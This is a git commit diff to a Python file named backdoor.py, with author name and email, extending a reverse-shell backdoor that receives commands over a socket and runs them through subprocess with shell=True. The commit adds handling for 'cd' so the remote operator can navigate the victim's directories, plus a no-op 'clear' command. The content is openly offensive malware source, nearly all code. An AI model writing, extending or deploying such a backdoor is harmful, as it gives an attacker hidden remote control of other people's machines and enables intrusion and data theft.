6ffd6825fd55ee5a86cbab2d8b08b62c7c505ff6
KingOfMaslina <kaplunovzahar82@gmail.com>
2025-01-10 19:32:06 +0300

    directory navigating

--- backdoor.py
+++ backdoor.py
@@ -2,6 +2,7 @@ import socket
 import time
 import json
 import subprocess
+import os
 
 def reliable_send(data):
     jsondata = json.dumps(data)
@@ -34,6 +35,10 @@ def shell():
         command = reliable_recieve()
         if command == 'quit':
             break
+        elif command[:3] == 'cd ':
+            os.chdir(command[3:])
+        elif command == 'clear':
+            pass
         else:
             try:
                 execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
